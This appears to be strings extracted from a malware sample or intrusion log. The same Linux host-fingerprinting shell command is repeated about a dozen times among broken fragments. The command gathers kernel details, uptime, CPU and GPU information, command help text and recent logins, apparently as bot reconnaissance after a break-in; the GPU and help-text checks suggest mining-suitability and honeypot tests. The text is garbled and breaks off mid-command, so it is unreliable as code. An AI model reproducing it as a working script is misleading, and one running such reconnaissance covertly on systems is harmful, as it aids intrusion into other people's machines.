		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cpuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n50);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$(last 2>/dev/null | head -n 10);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cpuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n50);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$(last 2>/dev/null | head -n 10);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cpuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n50);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$(last 2>/dev/null | head -n 10);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cpuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n50);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$(last 2>/dev/null | head -n 10);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cpuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n50);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$(last 2>/dev/null | head -n 10);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cpuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n50);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$(last 2>/dev/null | head -n 10);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cpuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n50);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$(last 2>/dev/null | head -n 10);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cpuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n50);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$(last 2>/dev/null | head -n 10);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cpuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n50);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$(last 2>/dev/null | head -n 10);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cpuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n50);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$(last 2>/dev/null | head -n 10);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cpuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n50);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$(last 2>/dev/null | head -n 10);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cpuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n50);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$(last 2>/dev/null | head -n 10);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cpuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n50);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$(last 2>/dev/null | head -n 10);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cpuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n50);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$(last 2>/dev/null | head -n 10);; 		echo 